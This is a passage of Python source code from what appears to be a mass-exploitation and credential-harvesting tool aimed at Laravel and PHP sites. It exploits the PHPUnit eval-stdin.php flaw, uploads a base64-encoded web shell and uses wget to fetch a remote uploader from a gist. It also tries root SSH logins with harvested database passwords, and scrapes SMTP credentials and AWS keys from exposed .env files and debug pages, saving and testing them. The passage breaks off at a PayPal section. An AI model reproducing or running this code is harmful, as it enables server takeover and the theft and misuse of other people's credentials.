				response = session.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=payload,verify=False,timeout=5,allow_redirects=False)

				if 'cepotdotid' in response.text:

					webshell_payload_wget = "<?php echo 'aw'.system('wget https://gist.githubusercontent.com/galehrizky/049876b180d52937f1579fbb5d156869/raw/b3c09645ba678bf82646b82d6b3e234d4fafca2f/uploader.php -O aw.php'); ?>"
					webshell_payload = "<?php $shell='PD9waHAgCgplY2hvICdTeXN0ZW06IDxmb250IGNvbG9yPSJibGFjayIgaWQ9InN5c3RlbV9pbmZvIj5nYWxlaGRvdGlkIycucGhwX3VuYW1lKCkuJyM8L2ZvbnQ+PGJyPic7CmVjaG8iPGJyPjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT4iOwplY2hvIjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1mPjxpbnB1dCBuYW1lPWsgdHlwZT1zdWJtaXQgaWQ9ayB2YWx1ZT11cGxvYWQ+PGJyPiI7CmlmKCRfUE9TVFsiayJdPT11cGxvYWQpIHsgCiAgICBpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siZiJdWyJuYW1lIl0pKSB7CiAgICAgICAgZWNobyI8Yj4iLiRfRklMRVNbImYiXVsibmFtZSJdOwogICAgfSBlbHNlIHsKICAgICAgZWNobyI8Yj5HYWdhbCB1cGxvYWQgY29rIjsKICB9Cn0KPz4=';file_put_contents('aw.php', base64_decode($shell)) ?>"
					kernel = re.findall("cepotdotid#(.*?)#", response.text)[0]
					session.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=webshell_payload,verify=False,timeout=5,allow_redirects=False)
					session.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=webshell_payload_wget,verify=False,timeout=5,allow_redirects=False)

					print(self.clr.green("[*] [PHP UNIT VULN] {}".format(url)))
					print(self.clr.green("[*] [KERNEL] [ {}]".format(kernel)))

					shell_path = url+'/vendor/phpunit/phpunit/src/Util/PHP/aw.php'
					webshell_check = requests.get(shell_path, verify=False,timeout=5,allow_redirects=False)

					if webshell_check.status_code == 200 and 'galehdotid' in webshell_check.text:
						print(self.clr.green("[*] [PHP UNIT VULN] [UPLOAD SHELL SUCCESS] {}".format(shell_path)))
						self.save(shell_path, "Results/phpunit_shell.txt")
						return True

					else:
						print(self.clr.yellow("[-] [PHP UNIT TRY MANUAL] {}".format(url)))
						self.save(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', "phpunit_manual.txt")
						return False

				else:
					print(self.clr.red("[-] [PHP UNIT NOT VULN] {}".format(url)))
					return False

		except Exception as e:
			pass

	def crack_vps(self,host_aw,url,username,password):
			try:

				if 'root' in username:

					if self.is_valid_ipv4_address(host_aw) == True:
						hostname = host_aw
					else:

						hostname = url
						hostname = hostname.replace("http://","")
						hostname = socket.gethostbyname(hostname)

					port = 22 ## Default port 22
					p = paramiko.SSHClient()
					p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					p.connect(hostname, port=port, username=username, password=password)
					stdin, stdout, stderr = p.exec_command("echo legion;uname -a;")
					opt = stdout.readlines()

					try:
						if 'legion' in opt[0]:
							self.save(url+"|"+hostname+"|"+port+"|"+username+"|"+password, 'Results/env/vps_cracked.txt')
						else:
							self.save(url+"|"+hostname+"|"+port+"|"+username+"|"+password, 'Results/env/vps_cracked.txt')

					except Exception as e:
						pass

			except Exception as e:
				pass

	def detect_smtp(self, mode,host,port,username,password,mail_from,from_name,url):
		if host == "null" or port == "null" or username == "null" or password == "null":
			return False
		else:
			if 'smtp.mailtrap.io' not in host or 'mailtrap.io' not in host:
				if 'sendgrid.net' in host:
					self.save(password, mode+'/'+mode+'_(SENDGRID).txt')
					ceker_sendgrid(url, password)
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.amazonaws.com' in host:
					self.save(host+"|"+port+"|"+username+"|"+password+"|"+mail_from, 'Results/'+mode+'/'+mode+'_(Smtp_Aws).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'office365' in host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Office365).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '1and1' in host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(1and1).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'zoho' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Zoho).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'mandrillapp' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password+"|"+mail_from, 'Results/'+mode+'/'+mode+'_(Mandrillapp).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'mailgun' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Mailgun).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.it' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Italy).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'hostinger' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Hostinger).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.yandex' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Yandex).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.OVH' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(OVH).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.zimbra' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Zimbra).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.kasserver' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Kasserver).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'smtp-relay.gmail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Gmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'sparkpostmail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Sparkpostmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'gmail.com' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Gmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'googlemail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Gmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'aruba.it' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Aruba).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'hetzner' in  host:
					self.save(port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Hetzner).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '163' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(163).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '263' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(263).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'aliyun' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Aliyun).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'att.net' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Att.net).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'chinaemail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Chinaemail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'comcast' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Comcast).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'cox.net' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Cox.net).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'earthlink' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Earthlink).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'global-mail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Global-mail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'gmx' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Gmx).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'godaddy' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Godaddy).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'hinet' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Hinet).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'hotmail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Hotmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'mail.ru' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Mail.ru).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'mimecast' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Mimecast).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'mweb' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Mweb).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'netease' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Netease).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'NetworkSolutions' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(NetworkSolutions).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'outlook' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Hotmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'qq' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(QQ).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'sina-email' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Sina-email).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'strato' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Strato).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'synaq' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Synaq).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'yihigher' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Yihigher).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'zmail' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Zmail).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'rise-tokyo' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Rise-tokyo).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'tatsumi-b' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Tatsumi-b).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'sendinblue' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Sendinblue).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'ionos' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Ionos).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'mailjet' in  host:
					self.save(host+"|"+port+"|"+username+"|"+password+"|"+mail_from, 'Results/'+mode+'/'+mode+'_(smtp_mailjet).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif '.jp' in host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Smtp_jp).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'sendinblue.com' in host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Smtp_sendinblue).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				elif 'emailsrvr.com' in host:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Rackspace).txt')
					sendtestoff(url, host, port, username, password, mail_from)
				else:
					self.save(host+"|"+port+"|"+username+"|"+password, 'Results/'+mode+'/'+mode+'_(Smtp_Random).txt')
					sendtestoff(url, host, port, username, password, mail_from)

	def get_smtp(self,text,url):

		try:
			if 'MAIL_HOST' in text:
				if 'MAIL_HOST=' in text:
					mode = 'env'
					text = text.replace("\n", "##")
					try:
						host = re.findall("MAIL_HOST=(.*?)##", text)[0]
					except:
						host = ''
					try:
						port = re.findall("MAIL_PORT=(.*?)##", text)[0]
					except:
						port = ''
					try:
						username = re.findall("MAIL_USERNAME=(.*?)##", text)[0]
					except:
						username = ''
					try:
						password = re.findall("MAIL_PASSWORD=(.*?)##", text)[0]
					except:
						password = ''
					try:
						mail_from = re.findall("MAIL_FROM_ADDRESS=(.*?)##", text)[0]
					except:
						mail_from = ''
					try:
						from_name = re.findall("MAIL_FROM_NAME=(.*?)##", text)[0]
					except:
						from_name = ''


					self.detect_smtp(mode,host,port,username,password,mail_from,from_name,url)
					return True
				elif '<td>MAIL_HOST</td>' in  text:
					mode = 'debug'
					try:
						host = re.findall("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						host = ''
					try:
						port = re.findall("<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						port = ''
					try:
						username = re.findall("<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						username = ''
					try:
						password = re.findall("<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						password = ''
					try:
					 	mail_from = re.findall("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mail_from = ''
					try:
						from_name = re.findall("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						from_name = ''

					self.detect_smtp(mode,host,port,username,password,mail_from,from_name,url)
					return True

				else:
					return False
			if 'SMTP_HOST' in text:
				if 'SMTP_HOST=' in text:
					mode = 'env'
					text = text.replace("\n", "##")
					try:
						host = re.findall("SMTP_HOST=(.*?)##", text)[0]
					except:
						host = ''
					try:
						port = re.findall("SMTP_PORT=(.*?)##", text)[0]
					except:
						port = ''
					try:
						username = re.findall("SMTP_USERNAME=(.*?)##", text)[0]
					except:
						username = ''
					try:
						password = re.findall("SMTP_PASSWORD=(.*?)##", text)[0]
					except:
						password = ''
					try:
						mail_from = re.findall("SMTP_FROM_ADDRESS=(.*?)##", text)[0]
					except:
						mail_from = ''
					try:
						from_name = re.findall("SMTP_FROM_NAME=(.*?)##", text)[0]
					except:
						from_name = ''


					self.detect_smtp(mode,host,port,username,password,mail_from,from_name,url)
					return True
				elif '<td>SMTP_HOST</td>' in  text:
					mode = 'debug'
					try:
						host = re.findall("<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						host = ''
					try:
						port = re.findall("<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						port = ''
					try:
						username = re.findall("<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						username = ''
					try:
						password = re.findall("<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						password = ''
					try:
					 	mail_from = re.findall("<td>SMTP_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mail_from = ''
					try:
						from_name = re.findall("<td>SMTP_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						from_name = ''

					self.detect_smtp(mode,host,port,username,password,mail_from,from_name,url)
					return True

				else:
					return False
			else:
				return False



		except Exception as e:
			pass

	def get_db(self,text,url):

		try:
			if 'DB_HOST' in text:
				if 'DB_HOST=' in text:
					text = text.replace("\n", "##")
					try:
						dbhost = re.findall("DB_HOST=(.*?)##", text)[0]
					except:
						dbhost = ''
					try:
						dbport = re.findall("DB_PORT=(.*?)##", text)[0]
					except:
						dbport = ''
					try:
						dbusername = re.findall("DB_USERNAME=(.*?)##", text)[0]
					except:
						dbusername = ''
					try:
						dbpassword = re.findall("DB_PASSWORD=(.*?)##", text)[0]
					except:
						dbpassword = ''
					self.crack_vps(url,dbhost,dbusername,dbpassword)
					self.save(url+"|"+dbhost+"|"+dbport+"|"+dbusername+"|"+dbpassword, 'Results/env/env_dblaravel.txt')
					return True

				elif '<td>DB_HOST</td>' in text:
						try:
							dbhost = re.findall("<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							dbhost = ''
						try:
							dbport = re.findall("<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							dbport = ''
						try:
							dbusername = re.findall("<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							dbusername = ''
						try:
							dbpassword = re.findall("<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							dbpassword = ''
						self.crack_vps(url,dbhost,dbusername,dbpassword)
						self.save(url+"|"+dbhost+"|"+dbport+"|"+dbusername+"|"+dbpassword, 'Results/debug/debug_dblaravel.txt')
						return True

				else:
					return False
			else:
				return False

		except Exception as e:
			pass

	def get_aws(self,text,url):

		try:
			if 'AWS_ACCESS_KEY_ID' in text:
				if 'AWS_ACCESS_KEY_ID=' in text:
					text = text.replace("\n", "##")
					try:
						aws_key = re.findall("AWS_ACCESS_KEY_ID=(.*?)##", text)[0]
					except:
						aws_key = ''
					try:
						aws_key_secret = re.findall("AWS_SECRET_ACCESS_KEY=(.*?)##", text)[0]
					except:
						aws_key_secret = ''
					try:
						asu = _exploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
						return False

					aws_bucket_ = cleanit(aws_key+'|'+aws_key_secret+'|'+aws_reg)
					self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
					it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_key_secret,aws_reg)
					return True

				elif '<td>AWS_ACCESS_KEY_ID</td>' in text:
					try:
						aws_key = re.findall("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_key_secret = re.findall("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key_secret = ''
					try:
						asu = _exploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
						return False


					aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
					self.save(aws_bucket_, 'Results/debug/debug_aws_bucket.txt')
					it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_key_secret,aws_reg)

					return True
				elif 'AWS_KEY' in text:
					if "AWS_KEY=" in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("AWS_KEY=(.*?)=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("AWS_SECRET=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False

						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif 'AWS_SES_KEY' in text:
					if "AWS_SES_KEY=" in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("AWS_SES_KEY=(.*?)=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("AWS_SES_SECRET=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False

						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif 'AWS_S3_KEY' in text:
					if "AWS_S3_KEY=" in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("AWS_S3_KEY=(.*?)=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("AWS_S3_SECRET=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False

						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif 'SES_KEY' in text:
					if "SES_KEY=" in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("SES_KEY=(.*?)=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("SES_SECRET=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False

						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif 'AWS_ACCESS_KEY_ID_2' in text:
					if "AWS_ACCESS_KEY_ID_2=" in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("AWS_ACCESS_KEY_ID_2=(.*?)=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("AWS_SECRET_ACCESS_KEY_2=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False

						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif 'WAS_ACCESS_KEY_ID' in text:
					if "WAS_ACCESS_KEY_ID=" in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("WAS_ACCESS_KEY_ID=(.*?)=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("WAS_SECRET_ACCESS_KEY=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False

						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif '<td>AWS_KEY</td>' in text:
						try:
							aws_key = re.findall("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_key_secret = ''
						try:
							aws_reg = re.findall("<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_reg = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False


						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/debug/debug_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif '<td>SES_KEY</td>' in text:
					if 'SES_KEY=' in text:
						text = text.replace("\n", "##")
						try:
							aws_key = re.findall("SES_KEY=(.*?)##", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("SES_SECRET=(.*?)##", text)[0]
						except:
							aws_key_secret = ''
						try:
							aws_reg = re.findall("SES_REGION=(.*?)##", text)[0]
						except:
							aws_reg = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False


						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/env/env_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif '<td>AWS_SES_KEY</td>' in  text:
						try:
							aws_key = re.findall("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False
						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/debug/debug_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				elif '<td>AWS_S3_KEY</td>' in  text:
						try:
							aws_key = re.findall("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_key = ''
						try:
							aws_key_secret = re.findall("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
							aws_key_secret = ''
						try:
							asu = _exploit().get_aws_region(text)
							if asu:
								aws_reg = asu
							else:
								aws_reg = ''
						except:
							aws_reg = ''
						if aws_key == "null" or aws_key_secret == "null" or aws_key == "" or aws_key_secret == "":
							return False
						aws_bucket_ = aws_key+'|'+aws_key_secret+'|'+aws_reg
						self.save(aws_bucket_, 'Results/debug/debug_aws_bucket.txt')
						it = f"{aws_key}:{aws_key_secret}:{aws_reg}"
						begin_check(it, to=emailnow)
						ceker_aws(url,aws_key,aws_key_secret,aws_reg)

						return True
				else:
					return False
			else:
				return False

		except Exception as e:
			pass
	def payment_api(self, text, url):

		if "PAYPAL_" in text:
